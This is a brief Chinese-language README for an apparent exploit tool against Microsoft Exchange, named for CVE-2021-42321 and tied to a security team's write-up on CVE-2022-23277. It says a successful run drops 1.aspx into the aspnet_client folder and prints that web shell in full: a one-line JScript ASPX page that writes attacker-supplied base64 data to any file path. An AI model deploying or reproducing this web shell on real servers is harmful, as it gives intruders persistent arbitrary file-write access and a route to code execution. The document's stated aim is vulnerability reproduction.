# exch_CVE-2021-42321

## 本文是7bits安全团队文章《DotNet安全-CVE-2022-23277漏洞复现》涉及到的工具

认证部分需要通过burpsuite手动添加，利用成功后会在aspnet_client写入1.aspx。

webshell:

```
<%@ Page Language="JScript" Debug="true"%><%@Import Namespace="System.IO"%><%File.WriteAllBytes(Request["b"], Convert.FromBase64String(Request["a"]));%>
```

利用详情可以参照我们的文章

### 欢迎关注我们的公众号 - Zbits2022

![](/images/qrcode.jpg)


